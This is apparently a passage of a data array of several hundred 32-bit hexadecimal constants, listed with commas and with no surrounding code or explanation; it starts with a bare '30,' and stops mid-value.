30,0x64edb173,0xe6c83af3,0xb653df95,0x797b58fb,0x4d2536d7,0x08f4da67,0x3851efba,0x24b94d0b,0x0e0cda8c,0x350bcf41,0x87872138,0xbb425fba,0xd86d5483,0x23670661,0x689162f5,0xb6f0db0b,0x6df37964,0xeaa0e293,0x6a90121a,0x1646077a,0xb7f47196,0x21c79862,0xcefda143,0xe99cf6d9,0xb7afa59a,0x0476b6ff,0x18574388,0xfd1eb0c1,0x4935fd6b,0x2feb02a7,0xfb851da8,0xc0022bf3,0x9871a360,0x06e60728,0xb1cc1203,0x20fea494,0x90549804,0xeaff2e0c,0x7b84ed61,0x907d93a4,0x921d879b,0xe5271217,0xe6dc0e02,0xc2e063ec,0x908733b0,0x6315df4c,0x45ae15a4,0xf20deda4,0xce5c75fa,0x0f39328a,0xc48b85e8,0xe872ffd8,0x0c222b32,0x137a6baf,0xf08b853c,0xdc41700f,0x41c2e7be,0x872df1c0,0x456c2cb7,0x61c6da56,0x6d837e98,0x0c8fce6d,0x520bb69e,0xc90dba8b,0x9e90e5b1,0x5a04ce7e,0x9c8ace5a,0x9732541c,0xd33955d2,0xf05b04bb,0x450bb962,0x7f27575f,0xf57519d9,0x0b565399,0xd41358f6,0xf06439f9,0x867a1986,0x570d6ebd,0xd5883f94,0x345f80d5,0x4a40c5cb,0xaaf92028,0xef68a5d7,0x6f91a42c,0xe91081cb,0x8fe29a10,0xfddc076d,0x4bcfeac1,0x3cd53cec,0x5e85de33,0x484bf023,0xdbff4dfe,0x9a86684c,0x9edacdfe,0x13d8a08c,0x2bdd4ebe,0x17ea910b,0xd5498923,0x8a4bf535,0x65c415c5,0x40d0bd3f,0xe2521a27,0xd0715917,0xa6e7a0c6,0x8246e8a5,0x2bce8cd5,0x11459fba,0x51ae9135,0xadaea546,0xc022e79f,0xa2a4ea3e,0x3e82e5db,0xf45f3163,0x6aeab274,0x1df97cad,0x54272bee,0xe797a1ef,0x098f1d37,0xf02f9964,0x95a3af74,0x263b217a,0x71918cbd,0x7b6ffc82,0x8ef94ce8,0x708d7e7e,0x7096acba,0x9c501508,0x4f664d60,0xff7dd6ff,0x1a5b60f3,0x8bd4f8d6,0x3dc01b13,0xb07f1852,0x028503e7,0x04c2c8a2,0x87635edb,0xc6721385,0xcc1d922c,0xdd9dffc4,0xc81da8d4,0x6e908474,0x2f28c636,0x49612785,0xb96e11a7,0xe8430a3c,0x3119df9e,0x28e2ded2,0x85785c13,0x844fffb7,0xea444bab,0x0fc5694d,0x9db7487b,0xcd022ad9,0xceaa971d,0xea1425a1,0xe3c444e0,0x6ff2a720,0x0c785641,0xd1bbc7b5,0x3e99aad1,0xd2678645,0x9e8e09a6,0xb5172206,0xcf156f84,0x06ffdd30,0x2703f28e,0xd0328cea,0x0bc3021a,0x7df0f5c7,0x4d00ebf8,0x9f2a046f,0x71140b7d,0xd36e6c02,0x7f649688,0x9a85c4c7,0xa09b95b4,0xca4b35e7,0x74bf3a86,0x826f4a97,0xf7f6d1d8,0xa5cc4843,0x6407000b,0xc1621b0b,0x9e2d916e,0x6855bbc1,0x66bc3275,0x0a829105,0x7724cef1,0xe37a542c,0xb29a9160,0x9465ca14,0xff9ed449,0xd8c53899,0x4b4f2485,0x204513ba,0xb5d41550,0x87453ba4,0x72a780bb,0xd28a21c3,0x320ae781,0xa09835b8,0xd9dec1fa,0x03015cf5,0x12634220,0x3cc2154b,0x4bee30c0,0x116fe9f3,0x2feb8c16,0x5fce2d47,0xcfe3575e,0x33eb2601,0x7d34caa3,0x18970548,0x4f841f93,0xc7c6d2fe,0x8eaa26ee,0x8aa718e3,0x9790af38,0xa9c4100a,0x52842abd,0xabff5005,0x3e2042cd,0x82f7b08e,0x9e9ff5c0,0xcbdc51a3,0x959468fb,0x2af5e110,0x214dc7bf,0x78afb6c7,0xa9e6179a,0x7392fd2a,0x186130e7,0x6cff63e0,0xa08e0261,0xcaf46b8c,0x24e9f862,0x41cdc1e0,0x2499ccae,0xbd894caa,0x82fb1767,0x04e1382b,0xa5c4a6fd,0x3ef62aec,0xd6b35084,0x0f1fa3bc,0x81b4fa0f,0x3aab5b4c,0x7bf8b374,0x0c87c5cf,0x150639a0,0x41c16ea7,0x82cecb9f,0x6f5fbb69,0xdca0e373,0xb057606d,0xf6e7d1e6,0x9c6c77aa,0x7c8df0a6,0xe2dd3340,0xc6d65de8,0x198f140d,0xac73ad8f,0xd39fcd8d,0x503db6c8,0x9905f423,0xe2e5ec97,0x8245fac6,0x6c932649,0xc6c0c040,0xa1c84514,0xa224f0ca,0x7b005b2c,0x5077a993,0x5ee4aa75,0xb48c5ccf,0x194b242f,0xcf571c01,0x3df19e5c,0x5d9e227c,0x2f77bf88,0x13af3c14,0xc0c915bb,0xfb585bd9,0xd69b2589,0xa7cce620,0x794a1041,0x02117803,0x28f96019,0xbb022fcf,0xd93ead80,0xcd91f4ab,0xf5869523,0x3e6266f0,0xc561c3d5,0x11197900,0x1126b7e9,0x5f2e7465,0x09586a8e,0x3c1897c7,0xd4e2314d,0xabdeafa7,0xdb8c28c8,0x5ad2b71e,0x82f20cf6,0x1ed59421,0xf37af9b0,0x64a46078,0xb8fd8e6c,0x59a103aa,0xa040f3e3,0xe22cca41,0xde2266da,0x346c060c,0x16b3f007,0xcec87f3c,0xdd3a2173,0x05f34259,0x94f1fbb9,0x4ee7027f,0x10b68d6a,0x40be34af,0x057913ba,0xf6f37aed,0x15a1b504,0xf4b331d4,0x30c57bef,0x26aff9c1,0x574209e1,0x40f27dfc,0x670c16f6,0x084a332d,0x36376ce2,0xd2e06716,0x0a95722d,0x6857abea,0xf0c8c627,0x6df64ab1,0x29a3b586,0x63e95902,0xe469984e,0x56043a7d,0xabf840c7,0x5b40ac74,0x8219bfbf,0xe23b1ba0,0x8a0be957,0x0ca824ca,0x05c5231f,0x658e9ba8,0xe0b7536d,0x976b52f8,0xb9ffb199,0x72ee5731,0x4db196d8,0x241261fa,0xa233aa25,0x553b748e,0x648e090e,0xa4b62087,0x60c86145,0x586fe612,0xca7a89fd,0xed1c18eb,0xd2d6f600,0x2ac251ae,0xd3cee6fd,0x8ccfc7a6,0x9ac18b4e,0xbe6696b3,0x4d6e8a1f,0xd98de4e4,0xc4a157d3,0x75b81e83,0x81246525,0xa148989c,0xb5938a0e,0x2234b0bb,0x798106fe,0x3b60836b,0x82a45ef4,0xdb6b1c08,0xba16600a,0x8f326496,0xe84eabf4,0x70a77445,0xb7cd90a2,0xfd1d0722,0x552dad2c,0xcb428c38,0x9c621ed1,0x0494a21c,0x2b84a4b1,0x60069b0c,0xeccde650,0x8a4dd9d2,0xecb874a2,0x5728ab45,0x079409d5,0x418e9ddd,0x3e89899d,0x6a7d4d0d,0x70289c18,0xdeb0299d,0xe349675a,0x3867a327,0xd997547e,0x589d4167,0x8527fe8a,0x5012d717,0x09e02cf8,0x636670bf,0x0817f08f,0xe9858f12,0x1f3e809a,0xe538a584,0xf4361bbb,0xb0572b0a,0x8abba011,0x0b13a137,0x473d79a3,0xe026b7f2,0xfc96ceb0,0x2aa03c34,0x640b792d,0x810246ab,0x188d1d91,0x943fa07a,0xbbda78d7,0xc940c976,0xf08579b4,0x8ffdf349,0x4b4e8a63,0xb1db0cf6,0xd8cea92d,0xb7187414,0x22cd48ce,0xe5c8acd6,0x88774119,0x77e8dfdb,0x157671ba,0x62cee06f,0x363eaaf1,0x2789201e,0xd9245e40,0x4052320f,0x1cff26c0,0x1b4eeae4,0x453c821d,0x54202127,0x78484a2c,0x01819c4f,0x619914c8,0x11a3049d,0x945c2531,0x5980626a,0xf1682d0d,0x1a28c1fc,0x1975743a,0x0b24d2ee,0x6ca99d6b,0xf9a9bf98,0x4d4e18a0,0x4819263f,0x29ee7296,0x5ea3663b,0x04afca8d,0x0988a1ab,0xc3b6ed4b,0xedfba286,0x437d533d,0x92e834ef,0x06be6e2c,0x2352bfd2,0xd16ddc6b,0xf99146b9,0xc89bd520,0xd88ba12e,0x4e49a992,0xe60728b3,0x1d8a968d,0xa84149d4,0xe7863e13,0x6d0f2edf,0xad878fa7,0xc04c6759,0xcf32ced1,0xcff55314,0xe1e32816,0xf4b296ef,0x6b1e407c,0x0a6c9657,0x038d89fd,0x0f86ba12,0xfcb9371a,0x42ebbb53,0xbe6c99da,0xc9864bad,0x93da6f61,0x2957d6c3,0x3ea21aa4,0x758bc5cd,0xd7c33018,0x41d151ce,0x6e17d94d,0xe4157d21,0xcfb72c34,0x0384f4e6,0xaad4db76,0xd56bac2f,0xf37ece1a,0x8e746150,0x900bae97,0xbfcad285,0x1de37252,0x1e70938b,0xf4739105,0x15c9985e,0x67f3e589,0x4469c8cd,0x36844385,0xc92ad667,0xef086df8,0xae3378fc,0x99431e2c,0x93fd8b06,0x68dca02c,0x86924ce8,0x3dba93b1,0xdd588452,0x6d65aff4,0x0901ee37,0xf1d66dc6,0x1513aa27,0xf8e16257,0x97aa1876,0xb5f402ad,0x41935dca,0x948a75b5,0x768b8196,0x97028f24,0x2c1ba418,0xd72dd303,0xe5ffa9ff,0x675887c3,0x59b6d042,0x365f26a4,0xa5941c9c,0xeb4358c8,0x4f377ea5,0xafcd1e94,0xd420eddc,0x68ae5c67,0x66ad2579,0xefa25b3f,0x5da1af1c,0x9d817672,0xe51d7da0,0x627e0931,0xd37dff1b,0xb81a7d5a,0x71e66177,0xfe9be51d,0x9187f209,0xd5986f70,0x361fa660,0xc503f876,0x375efb83,0xfd87029f,0x7238eae9,0x9b93937f,0xeaee6986,0xb645d721,0x0bb5dd49,0xd22343bc,0x7e8288eb,0xd3707c91,0x1a3075e4,0xea077f56,0xc80214ae,0x7adf81de,0x4904b0de,0x1feac4e0,0x236d19e6,0x1186c1f0,0x4347ae37,0x719406ef,0x1c458758,0x3990e2de,0x38993fe4,0xe9c40335,0xd77d60e1,0xd117d6a9,0x698cfe34,0xc30a9754,0xb957beec,0x598e9086,0xa2b83480,0xf7c5f68a,0x79842dfc,0x094f638e,0xf363c550,0xd37d6f1f,0x9b0412a7,0xf22a07b3,0x9f8f5fb7,0x635e8434,0xc8827a23,0x9438a930,0x4326dc22,0xfe6f1bd0,0x5c804e8a,0x1012456c,0xca6dd258,0xfd476961,0x7c963b00,0xe5794afb,0xb9215b03,0x442b2029,0x41997fd4,0xa4ca7ff7,0x41daf21b,0x0b3d688a,0xd5ea1dcd,0x99e84fae,0xadba905a,0x6cd76ec3,0x8e47b120,0xe5f380bf,0x43bce6dd,0x8513296d,0x24615a61,0xfa8e6671,0x61fd5b7d,0x9899d33e,0xb9a528a0,0x936c238b,0x3419210d,0xf82ec981,0xc142a262,0x22cbd84e,0x1992dd55,0x012d5c97,0x9655267c,0x6495c0f7,0x0dd44c76,0x800079b1,0xc412c70e,0x21207407,0x73ce1a07,0x1b85d8c4,0xc1ab8aa9,0xc311e314,0x654e7f5b,0xbd6978ea,0x2fc1e7a4,0x37eb18a3,0xcf922564,0x5940c81c,0xfde9ae91,0x729fefe3,0xfaf345d0,0x233d5849,0xe06e0f66,0x3b852bd7,0x82790621,0x9879365e,0x141d17eb,0x10e2fefe,0x31c69a10,0xb46c7a77,0xc3aea3a4,0x40353dbd,0x0f1029b7,0xb859d6a1,0x84146af7,0x0c576f0e,0x9f02535a,0xdeb3745c,0x64ea704e,0xc6259f1f,0xa76e05f9,0x0ca4822b,0xdc5ecbab,0xf09b8c5e,0x8232d1dc,0xa01c9a7b,0x59f361eb,0x517fce73,0xdb60477c,0x2195f251,0xb0b5df61,0xcd849aa3,0x3b77e4e4,0xa5e6a67f,0xe3a631ba,0xdcccf4fe,0xd76a11ca,0x5fb8dd37,0x0ef5f385,0xad825cac,0x9c2f41c0,0x9f606679,0x81a9d08f,0x277bced4,0x7cce71c0,0x30a9b9d8,0x039b154a,0xad66874f,0x735c3a20,0xf1b4e40d,0x61faa3e5,0x8ef61244,0x5109b291,0x17f2390d,0xeb0b5e90,0xc2163d25,0x972a3066,0x81476cb1,0xfccabd3f,0xdacdd3b7,0x0ddce3a9,0x8db58e16,0xfa49572e,0xb4d05f55,0x88b3d475,0xd1190511,0x4e22fd14,0xd1876a56,0xf590cc68,0x026b5d66,0x7167c156,0xee53f0b9,0xdcd450c0,0x38b12254,0x8fd3c01c,0x84350ebb,0x9ce3e396,0x8b7234a6,0x3dccb5f8,0x72aaca39,0x2c78ad1b,0xf59e98ff,0x77687d2f,0x057baf00,0x897ae30d,0xdaaa8891,0x1f682453,0x99cdf59d,0x605de008,0x96b75de4,0xc1e5a6fb,0x69573c2d,0xf0fe29c3,0x9b23d725,0x340f1e7f,0x27085ff1,0x87c3971c,0x55f393e6,0x8c2ea739,0x66446859,0xf4f8e646,0xf3b68f20,0xb077c87d,0x0e8bc636,0xad83d346,0x918f3529,0xba977ff2,0xc83fde56,0x4bdf745d,0xdc2d3a03,0x89734767,0x148f6bd4,0x3c27ee6e,0xb6d95996,0xc6318da3,0x1c469cec,0x5542a87a,0x1a13a4e4,0xe7757dd3,0xc55d430c,0xf0632119,0x90287d91,0x5d3315f6,0xc588269a,0x5e7d8737,0x2fa544e1,0x69ab799f,0x3fd07a09,0x3189c54e,0x97757ad9,0x8499da4c,0x779036ac,0x5e17c5c0,0xef11943a,0x80a76092,0x7577d556,0x5732c393,0x7242963a,0xb9b32822,0xa01242ad,0xd87fc5fe,0xf44dd90b,0x5d487316,0x851006a5,0xeb6fb889,0xad2b7c3d,0x780145e8,0xb57ba435,0x1619c1ea,0x35146726,0x772af11a,0xeaa4d265,0x5ca0ad8e,0x66ac039c,0xa964e195,0xd48d0125,0x4cff601b,0xfca84822,0x0e3a3f9f,0x437d987a,0x8ebd1f88,0xc65d1498,0x76bec2a0,0xf2f2ab00,0x81fcde4e,0xcafbd362,0xb65e0edb,0xe4d934f5,0x10501d9f,0x1b2e9a94,0xec33418a,0xc2082b31,0x76cd5cf1,0x13e024a6,0x91964e84,0xe52fa6ea,0xd9d88499,0x1485c36f,0x0664996a,0x047c5a21,0x766196ad,0x39a8c692,0xe4960c52,0x386bb815,0x4d8dd4b9,0xd4cf3e70,0x45ba8373,0xf6ed73ee,0xc51bc3a0,0xdb63c0c4,0xbc27208c,0x1341840f,0x1b3203b1,0x9577ea84,0x51afc22e,0x0107e0cf,0xae50a247,0x663225f9,0x475209cc,0x872030fa,0xb0bf2585,0x14ff56b0,0xecb3b53f,0x41543517,0xdbb07f05,0x2151f194,0xdae5ce08,0xe88fa233,0x9f3742be,0x2e15fc3b,0x558cfe67,0x97aba81c,0x4b19c1fc,0x88242e75,0xce1493e6,0x6e869bd5,0xb373d131,0xf1fb942c,0x27bcddf5,0xaab36834,0x01215c38,0x25fee9df,0x14dcccb1,0xdda99b66,0xb4e83f53,0xa579fced,0x538343d6,0xe7872e50,0xd04b869c,0xdc760c9a,0x0ab33e73,0x83f895a0,0x45078b49,0x7177d74b,0x88c79e45,0x572163f0,0x2416044c,0xf616e613,0x09b6534e,0x0610e380,0xcd23bae8,0x54966055,0xf9da00d3,0x4d7b4547,0x35e1c889,0x6963fa93,0x49b59429,0x1c3845d4,0x112d6608,0xcbc20dc3,0x450403d3,0xc4c1851c,0xebe80b4c,0x6c71af01,0xe8171801,0xa648ab75,0xb56a8be3,0xde884bb6,0x542ad3f8,0x67949abc,0xf4cdd6ce,0xc32233f1,0x2f0c3acc,0x32542716,0x298385f2,0xebe98cac,0xe0746358,0x08a44832,0x09b50174,0xb5169614,0x3ebe18d0,0x20e6d91e,0x38ba9651,0xc382a8a5,0xdae5eb65,0x1b0d4bc6,0x5c977a07,0xfd7f8ab4,0x1c959626,0xd9f5577a,0x65ba58ee,0x268d9ac8,0x4df26c38,0x8905abe6,0x66110545,0x3c7cb12e,0x1c3284f2,0xa39e61e7,0x13677274,0xaf6d62fd,0x9007ce8c,0xb07dd066,0x478a2daf,0x4c723f11,0xa6ced699,0x7ddd9c9c,0xaca82763,0x607fb845,0xd5efce02,0x6c356ced,0x840ea7a5,0x8fa2577a,0xb04d2be0,0x00ce9102,0xb7e65917,0x32176c3a,0x93874b96,0x97076825,0x74478078,0xfe42ee26,0x47930b00,0x62978b15,0x7bdb22ec,0xba903e7f,0x4fcf3fff,0xb51047d6,0xd1e176b4,0x0ecfd2f9,0xae874361,0xfc32e939,0xfaedc47e,0xbb738a7d,0x478ff5d7,0xb3416f0f,0xe8614f6d,0x10f2f4f7,0x75bc2d4e,0x3c8b3330,0x10ac96f0,0xd21ace04,0x32eeda66,0xea91196f,0xdf916bc2,0x41605f9b,0x52695ee9,0xf07d3901,0xd33de85c,0x75823424,0x68623a6c,0x2cf9b9eb,0xa0fb3b7f,0x3ce2c814,0x0e0f06a3,0xd4533b61,0x10d8c75d,0xe8b67d22,0x894a38ac,0xc504a21e,0x29fb39bb,0x2b6f8686,0x00d9c007,0x107487ad,0x2410f34a,0x36d3f7a7,0xa7ae672f,0x97e626a3,0xf010aa77,0xbe35b8e3,0x1a9fefce,0x0733f008,0x8d181dd8,0x87ddccf9,0x1c4c66d5,0x40cddd86,0x187ba705,0x7e07cb3d,0x23a1a576,0x67705c76,0x8dbd51cd,0x3f0c15d4,0x47966aa2,0x824e2bfb,0xcd8f3e79,0x416cf8e5,0x8f569904,0x39c90213,0x0732f65b,0x66db4d9c,0xa8352c2e,0x891b1b67,0x8896bfc9,0x4a97b4cf,0xe9327158,0x57bdc419,0x7d439760,0x39f3e61e,0xab9f3007,0xcba67b65,0xbc5cf6c1,0xe7bb58c3,0x21104725,0x4cc9d694,0xb783bcd3,0x4d58a72c,0xdb70d4e3,0xf48e37bb,0xe142aa6a,0x79b03013,0x66d37cad,0x5bd20132,0x36cdf4fd,0xc6ce639a,0xcf009fe0,0xf32b78ec,0x3f9b66e7,0x78405166,0x0b90e884,0x5aa5bc2d,0x9445bee7,0x98812a3e,0x8cd8584a,0xebd50bbf,0x6bff4ce3,0xf26cfb3e,0xaedb2594,0xafc12b6d,0x90c63530,0xc68d45e6,0xc58c5b39,0xa39841a2,0xf67d831b,0x1d6a7ba5,0x99bbdb9d,0x3baa80b5,0xe06ded03,0x1866a340,0x3c26b089,0x93c32aa0,0x4094b094,0x01cb6e72,0x03b102e9,0x8c270975,0x4212c734,0xd23faca8,0xa702c322,0x427b065d,0x66182d36,0x27ea9220,0xd7b6e5b2,0x91870b9c,0x9c189197,0x9693d774,0x69847762,0x879c2b2b,0xb072cab2,0x3b4b9876,0x24e4f72e,0x7db30ea6,0x015a05ad,0x047ec213,0xf902e25a,0x6df79d3a,0x458924ac,0xb94c7eed,0x2155cfdc,0x695fccd9,0x5889c853,0xf9011ec1,0x6e68f639,0xd1efa301,0x47fb4ba4,0x73d72380,0xb1d87d30,0x1779623b,0x353de8be,0xa0916807,0x2db1453b,0xf77c234c,0xeef133de,0x8112976c,0xeff86471,0x1a1d6140,0x6754a5f7,0x42b3bbef,0x399262ca,0xa5517c4e,0x7e881ace,0x6acb4485,0xccde881c,0x22a6ef00,0x792094a1,0x97e2d364,0x3b6525c7,0xb57a27fb,0xd4c8f8d5,0xcd49fec8,0xa9378502,0xd6a9e9f2,0xc742d82b,0x2f5eb11f,0xb43ec775,0x33ac92b6,0xdd4183ad,0xf52f219b,0x4264ecf7,0x7c142605,0x3f33d1c0,0xb53792b0,0x65dbd757,0xe2944b7b,0x48b70414,0x61e712b2,0x350cec97,0x92b6bda8,0xcc9c8246,0x8f5e489f,0x339265bd,0x25275d23,0xed2e8aa1,0x2b06eb5d,0xb1b5cd21,0x24904a8f,0xc22c8dc4,0x8668c64d,0x2fe01e40,0x17f60eb2,0xd65a1a33,0x2a3c53b6,0xb11be974,0x5591bc91,0x2c8c3c7b,0xc6c10d34,0x8f89a0c7,0x8d342538,0x21437dda,0x339d1354,0x6cc02253,0xbe64b70e,0xc0ba4b0c,0xaaf141bd,0x01d1ea1d,0x04fd4620,0xd7832a4c,0x2a370bf3,0x8df9c90c,0x04fa5ca2,0xe05d7120,0xc138da80,0x77f9712b,0x9d80143a,0x18a9a042,0x2c563a80,0xa67c729f,0xd649f7f4,0x846ea949,0x47228b4b,0x7e464645,0x2325aee7,0xde12c0d1,0x5bd642fb,0x678c7576,0x62a3e8fd,0xa9caea87,0x12a99811,0x1fdf1558,0xa31d66bc,0xfacd0bb1,0x7dd2d3f3,0x01640727,0xb1f9d4a5,0x6c56e629,0x39035089,0x1177b43f,0xfca88bdd,0xd3c5845f,0x28a41fa4,0x13548f17,0xc35e9ec4,0x1bd3ea16,0x22de4507,0x4c0efc68,0xd8c3f7fb,0x39c5e3b0,0xafb09da6,0x8dca22bb,0xbdc137e6,0xdb11324a,0xdef63ebb,0x4bf5694b,0x1671e852,0xd5abd57b,0x1a86a164,0xc6b506a4,0xefca66fc,0x1b554a1c,0xe1699e71,0xf40f77cd,0x24e0f2fc,0x63a545bf,0x66f4a8a6,0x8bc52b32,0x652aadf0,0x5d203d74,0x2f1d3daa,0x0a0b0884,0x5166d4f8,0x670ea3e8,0xc737c17a,0xf5eda15b,0x1c954ca0,0xb820196d,0x40000dba,0xd066487b,0x547ee107,0x233b94e3,0x5d358af7,0x6d3a08f4,0x7a898d94,0xb29fa6a0,0x1ab2baa0,0x5fc6b757,0x698bdf32,0x89e7ff5e,0xb4b3c6c9,0x35a93baf,0xb1ecd492,0xff15e185,0x9c38f270,0x759150b2,0xb3bbb0e7,0x77e2ec05,0xf905298b,0xeaa1623d,0xe1c9b665,0xede94bc1,0xdaa1bdec,0x21e7439b,0x20b428e7,0x3fc5b442,0x5298b9d0,0x4b008723,0x3fa405b3,0xea97085d,0x5de33942,0x9b3a6397,0x168bd0c8,0x4b5aaa03,0x17e1877e,0x4f52c4f1,0x41585a6f,0x6c272275,0x744ca137,0xb2b505aa,0x948d2a73,0x718f7d93,0x096f8ca6,0x0387bec7,0xff5950ea,0xd87be767,0xd93f760a,0x4d507e5f,0x6dc5ede5,0x1deaa7ac,0x55910dda,0x21f6b97e,0xda2d4bbf,0x8f4c9e05,0x6fce38a2,0x05efd50f,0x687d7c73,0x3fa14550,0xa5c18d56,0xca7d9e94,0x8398d410,0xd6fe0c3a,0xb5ef50e9,0x530cbce8,0xc134b8cb,0x64933b0c,0x0ac2ebdc,0x48d4378a,0x4c5e43d6,0x6e79417d,0x0fe7e0bb,0x7af9e6ea,0x301f0da5,0xb13d30d6,0x402b2153,0xd3e05f4c,0x7114fd87,0x5ec30b76,0x170fcade,0x65374616,0x357be769,0x01f5003e,0x1b86fd0a,0xea73165b,0x38a316fb,0xda4410da,0xb75502e9,0xf44da11c,0xcfddee68,0xd47ed016,0x2f6d441b,0xcc321fed,0xc94b7fe6,0x0c895e01,0xdb310d03,0x9bc4b096,0x482efbd1,0xa677f1b0,0x1b81e5c9,0x76e02e6e,0xc6a72f8c,0xf6feedfd,0x3daa7dbb,0x3be34615,0x1204b18b,0x8fed999c,0x865cc30c,0x0b472466,0x2f966649,0x81e0de8a,0x4c292215,0x472bf99f,0x03519e6c,0x528c4cef,0x64674940,0x4a7864ce,0x0a9537d8,0xf474bab5,0x9b4dbe79,0xf5917e57,0x017119f9,0xabb8cef4,0xc9aa7583,0x61ce98cd,0x6b1d9eb6,0x07af28aa,0x9b6ee2b4,0x95986750,0xe3d8e421,0x3b36e608,0x6bb9b271,0xdaf2757f,0xd20d58d8,0x485d7da8,0x50744756,0x0f219b1a,0x213795c2,0x6f82380b,0x6d9ad928,0x444d399d,0xe29eea76,0x24731238,0x227e83d6,0x7d90a0fa,0x81a284be,0xa2f7f88a,0x3183bfdd,0x301bad81,0x6025ad10,0x6038f532,0xf46eef8a,0x37c1c8ec,0x5044ebbc,0xab77f83d,0xc12a51f2,0xcc410b12,0xd9c29638,0x9db05871,0xb7289e27,0x8a9e4f76,0x3ce5a0ed,0x8758219c,0x9cddcabe,0x0d9d7cf0,0xa7ad868b,0x251f4aa8,0xde15c539,0xaf4d55e7,0x25aef618,0x5c30a49e,0x5a550452,0x52193547,0x7e7e4aec,0xfd3d402b,0xcffd88c9,0x5bba94ac,0xefadb3c6,0x12cda970,0xe1e5a864,0xfdadcb66,0x7f33d479,0xbeed7403,0x3a11054f,0x7dff5b0b,0x67b42591,0x776e6f47,0xd1238448,0xd2a13558,0xac13e3a6,0x38ce0e4c,0x72be1469,0x83df7f1b,0x3f81a1d9,0x0dacab7e,0x5970566a,0xcd4d74b0,0xcd071524,0xf755297a,0x7f9c773b,0x609faa32,0x6e29e45b,0x21743d8f,0x5b73ac1b,0xdcf6e20f,0x42edd58e,0x8efe0127,0x8c70f5c4,0x362d59f7,0x979d5c3d,0x0f2902de,0x0dbcdf52,0x1d23e08a,0x9fbdbb92,0x778e44e5,0xf4f009d7,0x4cf67335,0x0e40082b,0x3737270e,0xcb7c7e29,0x8763e379,0x9a8969f4,0x43423269,0xe940b83c,0x12509090,0x5709f866,0xc1098b92,0x0c67cb3e,0x8d4ee2bc,0x3250384c,0xd48a3fad,0x41e175c5,0xa53c3729,0xc0e342bb,0xe083cf23,0xa5c81ef0,0x0d235718,0xb14f9b7b,0xe7465d47,0x3b2bd7e9,0xd51c7f1b,0xf183f110,0x1bd135f7,0x0ed14cb8,0xe7dcdd3b,0x38557c96,0x2ddb05e6,0x6bf7fb7a,0x226a4ee3,0xd70ce4f0,0x0700df34,0x66e315fb,0x4720d130,0xa5321f83,0x1316ffd6,0xb46d20df,0x894fb95c,0x252f1122,0x1e49b33b,0xd486c629,0xfd58268f,0x463a34db,0xb1292fbe,0x7a65c9b4,0x7dd29b81,0xc7290912,0x884c063a,0x80a1a47e,0xbe764110,0x433daed9,0x1dea38f0,0x40d3cf34,0x84196a33,0x6c741e20,0xc8300121,0xda6d8324,0x2fd5298c,0xfdd8a38f,0x8657fb4f,0x63c14cf9,0x95a21d42,0x6943c37c,0xbb29792c,0x93747f58,0x3b1a9a06,0x08c78ad9,0x8985f67a,0x9da6d577,0x3d850ff4,0x60763982,0x1644d19d,0xd81bfdca,0xe68bbcbc,0x5651a1c3,0x8e4ff918,0x96c75fa6,0xc266d69c,0x5266f6c0,0x8533a67e,0x1cc9e7a7,0x7cea4c0e,0x89583abf,0x52efc7c0,0x41f8e614,0xe535c51a,0xce171e38,0xdc79c558,0xf8d19152,0xb0269e3c,0x67ae4197,0xffa016da,0x9a761e6a,0x7c1162b3,0x586ebcb5,0x80e5c537,0xd070e694,0xe3a291c1,0x8da1af4e,0x6016bad5,0xbb6f79b2,0x87ec6e81,0xf2079776,0x2f65c6da,0x08d08f0f,0xdb564241,0x49656d83,0x3ef8cc17,0xecc46e88,0x0ae9a2aa,0x450883bc,0xbbc7f5fd,0xb450382a,0xb658bd02,0x38f5394d,0x8e249d8f,0x5df0b9f2,0x7a8b9521,0x136b0606,0x8c9d1a8d,0x6794f523,0xc32acb58,0x789a6615,0x807a0ce4,0x93aca2e1,0x5e5fd1c3,0xabff5788,0x6d9f205c,0x4bde6e04,0xfb7519b2,0x49951353,0xd5cdf3eb,0x112bdb4b,0x91814e6e,0x64901c52,0x3204a1f6,0x521afed7,0x31a4edc2,0x1740a22e,0xdd2c5625,0x15f7b1e0,0xa130bbe5,0x594ef77e,0x156996bc,0x9ca32ed1,0x9e50d1ec,0x325a49ed,0x1018efa5,0x68438ba5,0x05c0cf8d,0x54926455,0x7d31b3d2,0x728bf9e6,0x8c867df9,0xaece314f,0x3eb3a6e4,0x28b7cb3a,0x07944f79,0x2a830b48,0xa1d93e69,0xd19893ca,0xf2085025,0x8c367d2e,0xce05681b,0x9ddd49bb,0x8c8c56ba,0x689409ab,0xdfdda856,0x3509fd46,0x6b3d0e96,0x3cc0bbb2,0x7a8cad34,0xbe4991e1,0x860ea0f9,0x3456e563,0xc35a7169,0xd049447e,0x1d19ffdf,0x1fabd4c6,0xb75d627e,0x6a31606c,0x646799b6,0xa18e5bf5,0x1426129b,0x7a3c6c16,0xe499a10b,0xd6e5c89a,0x088388dd,0xd601b8cb,0x27951414,0x431167f4,0x6498f4e2,0x87fb4de0,0x9695f45c,0x531dd547,0x76fd4137,0x15477781,0xed90c57d,0x3c4e5077,0x58fe0f3f,0x26da7287,0x49696ff9,0x5ede897e,0x0aaa129e,0x0468a4f1,0xb53a14d9,0x4383ea65,0xe0a0b69f,0x4f9f6f4b,0xd295b408,0x5dc53f74,0x8024774a,0xb1d439c7,0x0a2973ae,0x4c84d602,0xf0cef79b,0x1bfb1ea8,0xd72b7273,0xc33ecebd,0xb7aaef4e,0x3d4ff045,0x32823abc,0xbbdc4696,0xe61619bb,0x1cd80511,0x4f7191c4,0xaba9e113,0xec93922a,0x10619a42,0x76d913a7,0x3cabd9c3,0x4b620d55,0xb4a385fb,0xf2c857f8,0xf9048034,0x8be806e0,0xe4e7912c,0xffc66c28,0xb5016172,0x2ba5540b,0x253d6612,0x91d1659e,0xb60d029a,0x723924f1,0x3db98d9c,0xeddcea1c,0xfda7c240,0x3cbc77b5,0xcf5c206b,0xca8fe9ce,0xd4763977,0xa761df07,0x3002e83b,0x513836bb,0x28414a80,0xa786a0a6,0xeda3e10b,0x1251f94e,0xf05044bf,0x95f11719,0x68cb534a,0x8b3132a8,0x74e1f293,0xf5d05eba,0x783f4986,0x1e9c6ff7,0xf15de5e3,0xba634f57,0x5b363332,0x89968163,0x041f0e72,0x2a6b5959,0xba2bccdf,0xf3c9749b,0x14bf657d,0xbf278eb9,0x6f5aab6c,0x7a1168b4,0x458a6e82,0xb53c2380,0x32366826,0x832b7304,0x2b5a4570,0x36a1cdf7,0x39a15c7a,0x6b623ef0,0x62011429,0x086e347f,0xaa7a0102,0x9eecf4a2,0x0b728b83,0x41366d55,0xbc69f410,0x835832f6,0xf9ffab5f,0xbf6122a8,0xd5f37eb8,0xdd3847cf,0x5391ec3f,0x0757c7c5,0xb64ef6f7,0x3955ee9d,0xcb873710,0xb